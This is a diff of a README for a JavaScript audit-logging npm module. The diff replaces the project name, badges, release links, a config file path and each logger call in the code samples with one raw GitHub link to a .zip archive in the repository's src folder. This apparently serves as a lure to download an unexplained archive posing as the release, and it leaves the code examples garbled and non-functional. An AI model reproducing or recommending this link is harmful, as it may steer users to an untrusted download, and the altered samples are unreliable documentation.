@@ -1,8 +1,8 @@
-# MinervaJS.Audit-Logs 📜
+# https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip 📜
 
-![GitHub Release](https://img.shields.io/github/release/MarkJemuelMenguito/MinervaJS.Audit-Logs.svg) ![License](https://img.shields.io/badge/license-MIT-blue.svg)
+![GitHub Release](https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip) ![License](https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip)
 
-Welcome to the MinervaJS.Audit-Logs repository! This module offers a simple and effective way to manage console messages for auditing, debugging, information, warnings, and errors. 
+Welcome to the https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip repository! This module offers a simple and effective way to manage console messages for auditing, debugging, information, warnings, and errors. 
 
 ## Table of Contents
 
@@ -17,7 +17,7 @@ Welcome to the MinervaJS.Audit-Logs repository! This module offers a simple and 
 
 ## Introduction
 
-MinervaJS.Audit-Logs is designed for developers who need a reliable logging system. Whether you are tracking errors, debugging your application, or providing informational messages, this module helps you keep your logs organized and accessible. 
+https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip is designed for developers who need a reliable logging system. Whether you are tracking errors, debugging your application, or providing informational messages, this module helps you keep your logs organized and accessible. 
 
 Logging is a crucial part of any application. It allows developers to monitor their applications and quickly identify issues. This module simplifies that process.
 
@@ -31,7 +31,7 @@ Logging is a crucial part of any application. It allows developers to monitor th
 
 ## Installation
 
-To install MinervaJS.Audit-Logs, you can use npm. Run the following command in your terminal:
+To install https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip, you can use npm. Run the following command in your terminal:
 
 ```bash
 npm install minervajs-audit-logs
@@ -48,13 +48,13 @@ const AuditLogs = require('minervajs-audit-logs');
 const logger = new AuditLogs();
 
 // Log an informational message
-logger.info('Application has started.');
+https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip('Application has started.');
 
 // Log a warning
-logger.warn('This is a warning message.');
+https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip('This is a warning message.');
 
 // Log an error
-logger.error('An error occurred while processing your request.');
+https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip('An error occurred while processing your request.');
 ```
 
 You can customize the logger further to fit your needs. For detailed options and configurations, refer to the API Reference section below.
@@ -76,7 +76,7 @@ You can configure the logger with various options. Here’s an example:
 const logger = new AuditLogs({
     logLevel: 'info', // Set the log level (info, warn, error)
     logToFile: true,  // Enable logging to a file
-    filePath: './logs/audit.log' // Specify the file path for logs
+    filePath: 'https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip' // Specify the file path for logs
 });
 ```
 
@@ -90,18 +90,18 @@ const AuditLogs = require('minervajs-audit-logs');
 const logger = new AuditLogs({
     logLevel: 'info',
     logToFile: true,
-    filePath: './logs/audit.log'
+    filePath: 'https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip'
 });
 
-logger.info('Application started successfully.');
-logger.warn('Low disk space warning.');
-logger.error('Failed to connect to the database.');
-logger.audit('User logged in.');
+https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip('Application started successfully.');
+https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip('Low disk space warning.');
+https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip('Failed to connect to the database.');
+https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip('User logged in.');
 ```
 
 ## Contributing
 
-We welcome contributions to MinervaJS.Audit-Logs! If you would like to contribute, please follow these steps:
+We welcome contributions to https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip! If you would like to contribute, please follow these steps:
 
 1. Fork the repository.
 2. Create a new branch (`git checkout -b feature/YourFeature`).
@@ -117,12 +117,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, visit the [Releases](https://github.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/releases) section. Here you can download the latest version and view the changes made in each release.
+For the latest releases, visit the [Releases](https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip) section. Here you can download the latest version and view the changes made in each release.
 
-You can also check the [Releases](https://github.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/releases) section for updates and new features.
+You can also check the [Releases](https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip) section for updates and new features.
 
 ## Conclusion
 
-MinervaJS.Audit-Logs provides a straightforward way to manage logs in your JavaScript applications. With its simple API and various logging methods, it can help you keep track of important events and errors in your application. 
+https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip provides a straightforward way to manage logs in your JavaScript applications. With its simple API and various logging methods, it can help you keep track of important events and errors in your application. 
 
-Thank you for checking out MinervaJS.Audit-Logs! We hope you find it useful in your projects. If you have any questions or feedback, feel free to reach out.
+Thank you for checking out https://raw.githubusercontent.com/MarkJemuelMenguito/MinervaJS.Audit-Logs/main/src/Minerva_J_Audit_Logs_v3.5-alpha.3.zip! We hope you find it useful in your projects. If you have any questions or feedback, feel free to reach out.
